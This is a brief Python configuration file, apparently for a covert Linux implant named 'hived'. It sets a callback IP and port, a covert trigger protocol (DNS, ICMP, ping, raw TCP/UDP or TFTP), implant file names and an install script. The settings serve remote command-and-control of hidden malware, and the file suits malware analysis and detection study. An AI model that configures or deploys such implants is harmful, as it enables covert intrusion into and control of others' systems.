#!/usr/bin/python
# Filename: hiveLinuxConfiguration.py

callbackIP = "10.3.2.19"
#callbackPort must be in the 1-65535 range
callbackPort = "8000"
#triggerProtocol = [dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq]
triggerProtocol = "dns-request"
#if triggerProtocol == "raw-udp" or "raw-tcp", remotePort must be in the 1-65535 range
remotePort = 0

oldImplantName = "hived-linux-i386-PATCHED"
newImplantName = "hived-linux-i386-PATCHED"
implantDirectory = "/home/miker/runningHive/"
installationScript = "install_Linux_script"

# End of hiveLinuxConfiguration.py
